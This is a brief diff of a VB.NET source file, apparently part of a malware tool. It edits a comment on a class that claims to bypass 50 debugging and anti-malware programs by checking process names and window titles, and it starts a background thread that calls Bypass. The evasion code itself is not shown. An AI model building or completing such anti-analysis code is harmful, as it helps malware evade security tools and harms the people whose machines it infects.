@@ -1,5 +1,5 @@
 ﻿Imports System.Diagnostics
-Public Class Screening_Programs ' Bypassing 50 Screaning Programs Use MainWindowTitle + GetProcessesByName
+Public Class Screening_Programs ' Bypassing 50 Debuging and Anti-Malware Programs Using MainWindowTitle + GetProcessesByName
     Public Function Start()
         Dim thread As New Threading.Thread(Sub() Bypass(True))
         thread.IsBackground = True
